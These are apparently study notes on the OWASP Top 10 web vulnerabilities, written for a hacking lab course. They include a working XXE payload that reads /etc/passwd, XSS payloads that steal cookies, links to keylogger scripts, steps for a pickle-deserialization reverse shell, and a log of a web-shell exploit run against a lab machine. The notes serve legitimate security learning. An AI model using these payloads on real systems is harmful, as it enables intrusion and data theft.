# OWASP Top 10

## Injection
- User controlled input is interpreted as commands or parameters by the application.
- Injection attacks depends on the type of technologies used & how exactly the input is interpreted by these technologies.
- Examples:- SQL Injection, Command Injection
- The main defence is for preventing attacks is ensuring that user controlled input is not intepreted as queries or commands.
- There are different ways of doing this.
  - Using an allow list: when an input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked safe, then it is processed. Otherwise the application throws an error.
  - Stripping Input: If the input contains dangerous characters, these characters are removed before they are processed. 
- In modern applications, there are libraries which will do this kind of defence job for you.

### OS Command Injection
- Command injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.
- It is a web vuln that allows an attacker to take advantage of that made system call to execute operating system commands on the server.
- The command injection opens many options for attacker
- Blind Command Injection: Blind command injection occurs when the system command made to the server does not return the response to the user in HTML document.
- Active Command Injection: Active command injection occurs when the system command made to the server return the response to the user in HTML.

## Broken Authentication & Session Management

- Web app -> User (Web Browser) -> Username/password -> Credential Validation -> Session Cookie to track user actions.
- An attacker can break the authentication & try to login as other users if there is 
  - Brute force attacks
  - Weak Credentials
  - Weak Session Cookies - Predictable session cookie values
  - Forgetting to sanitize users input(Exploitation: Re-register an existing user there by gaining the same privilege levels)
- Mitigation
  - strong password policy
  - automatic lockout of user's account
  - implement multi-factor authentication

## Sensitive Data Exposure
- When a web app accidentally exposes/divulges sensitive data we call it sensitive data exposure.
- This is often data directly linked to the customers (e.g names, DOB's, financial information  etc.,) but could also be more technical information such as usernames and passwords
- At more complex levels it could be an MIM attack trying to force their way through breaking weak encryption on any transmitted data to gain access to the intercepted information.
- Sometimes sensitive data can be found on the webserver itself.
```
sqlite3

.tables

select * from users;

pragma table_info(users);
```


## XML external entity

- An XML external entity (XXE) attack is a vulnerability that abuses XML parsers/data.
- It often allows an attacker to iteract with any backend or external systems that the application itself will access & can allow the attacker to read the file on that system.
- They could use XXE to perform request Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications.
- XXE may even lead to port-scanning & allow for Remote Code Execution

There are two-types of XXE attacks: in-band & out-of-band (OOB-XXE)
1. An in-band XXE attack is the one in which the attacker can receive an immediate response.
2. An Out-of-band XXE attack (blind XXE) is where there is no immediate response from the web application & attacker has to reflect the output of their XXE payload to some other file or their own server.

### DTD

- DTD (Document Type Definition) defines the structure & the legal elements & attributes of an XML document.
- Let us try to understand this with an example.
```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```
- !DOCTYPE note - Defines a root element of the document named note
- !ELEMENT note - Defines that the note element must contain the elements: "to,from,heading,body"
- !ELEMENT to - Defines the `to` element to be of type "#PCDATA"
- !ELEMENT from - Defines the `from` element to be of type "#PCDATA"
- !ELEMENT heading - Defines the `heading` element to be of type "#PCDATA"
- !ELEMENT body - Defines the `body` element to be of type "#PCDATA"

Note: "#PCDATA" means parsable character data.


- Below is an XML document that uses.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```
- `!ELEMENT` to define a new ELEMENT
- `!DOCTYPE` to define a ROOT element
- `!ENTITY` to define a new ENTITY


### XXE payload

```

<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>

```

- As we can see we are defining a ENTITY called `name` & assiging it a value called `feast`. Later we are using ENTITY in our code.
- We can also use XXE to read some sensitive file by defining an ENTITY & having it use the SYSTEM keyword.

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

```
- We are defining an ENTITY with the name `read` but the difference is we are setting it to value `SYSTEM` & path of the file.
- If we use this payload, then a website vulnerable to XXE would display the contents of the file `/etc/passwd`
- In a similar manner, you can read other files.


## Broken Access Control

- To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.

### IDOR - Insecure Direct Object Reference
- Its an act of exploiting the mis-configuration in the way user input is handled, to access resources you wouldn't normally able to access.
- try changing url parameters & you will find access to the information.

## Security Mis-Configuration

- Security misconfigurations include
  - poorly configured permissions on cloud services like s3 buckets.
  - having unnecessary features enabled, like services, pages, accounts or privileges
  - default accounts with unchanged passwords
  - error messages that are overly detailed & allow an attacker to find out more about the system.
  - Not using "HTTP Security Headers", or revealing too much detail in the server: HTTP header.
- This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.
- Whatever the app is, search for the default credentials that are there, surf the internet & that is all it takes

## Cross-Site Scripting (XSS)
- A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in javascript, VBscript, Flash & CSS. There are 3 main types of cross-site scripting.

### Stored XSS
- The most dangerous type of XSS. This is where a malicious string originates from the website's database. This often happens when a website allows user input that is not sanitized when inserted into the database.
### Reflected XSS
- The malicious payload is part of victims request to the website. The website includes this payload in response back to the server. To summarize, the attacker needs to trick the victim to click the url to execute their malicious payload.
### DOM-Based XSS
- DOM stands for Document Object Model & is a programming interface for HTML & XML documents. It represents the page so that the programs can change the document structure, style and content. 


### XSS Payloads
- `<script>alert("Hello World")</script>`
- `<script>alert(window.location.hostname)</script>`
- `<script>alert(document.cookie)</script>`
- `<img src=x onerror=alert('XSS');>`
- `<script>document.getByElementId("thm-title").innerHTML="I am a hacker"</script>`
- `<iframe src="javascript:alert(`xss`)">
- [XSS Keylogger](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
- [XSS PortScanning](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)


## Insecure Deserialization
- This definition is still quite the board to say the least.
- Simply, insecure deserialization is replacing data processed by an application with malicious code allowing anything from DoS (Denial of Service) to RCE(Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.
- Specifically this code leverages the legitimate serialization & de-serialization process used by web applications.
- At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data retained or queried.
  - E-commerce websites
  - Forums
  - API's
  - Application Runtimes (Tomcat, Jenkins, JBoss)

### Code Execution
- Usually an application trusts whatever is encoded as trustworthy
```
cookie={"payload": payload}
pickle_payload=pickle.dumps(cookie)
encodedPayloadCookie=base64.b64encode(pickle_payload)
resp=make_response(redirect("/myprofile"))
resp.set_cookie("encodedPayload",encodedPayloadCookie)


>>> import pickle
>>> cookie={"payload":"sample payload"}
>>> pickle_payload=pickle.dumps(cookie)
>>> pickle_payload
b'\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x07payload\x94\x8c\x0esample payload\x94s.'
>>> encoded_payload=base64.b64encode(pickle_payload)
>>> encoded_payload
b'gASVHwAAAAAAAAB9lIwHcGF5bG9hZJSMDnNhbXBsZSBwYXlsb2FklHMu'
>>> 
```
- Usually cookies (encodedPayloadCookie) is stored on your browser
- Once you visit a particular form this cookie is decoded & de-serialized with a code something like this.
```
cookie=request.cookie.get("encodedPayload")
pickle.loads(base64.b64decode(cookie))
```
- Now using a vulnerability in pickle you can encode a reverse shell code & set the cookie
- this will help you get the reverse shell on the target machine
- take a look at [RCE.py](./rce.py)


## Components with Known Vulnerabilities
- If the vuln is already well known, it may open may doors for an attacker to penetrate the app & obtain a RCE
- So, even if the company misses a single update, they could be vulnerable to any number of attacks.
- Hence OWASP has rated this a number 3 - as a company can easily miss an update to their application.
- All you need to do is find the exploit & run it against the target to obtain a reverse shell

You exploit PHP vulnerability
https://www.exploit-db.com/exploits/47887

```
python3 exploit.py http://10.10.88.112
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.88.112/bootstrap/img/F6Zn61GQJX.php
> Example command usage: http://10.10.88.112/bootstrap/img/F6Zn61GQJX.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ whoami
www-data

RCE $ wc -c /etc/passwd
1611 /etc/passwd

RCE $ 
```

## References
- [Web Enumeration](./web_enumeration)
- [Upload Vulns](./upload_vulns)
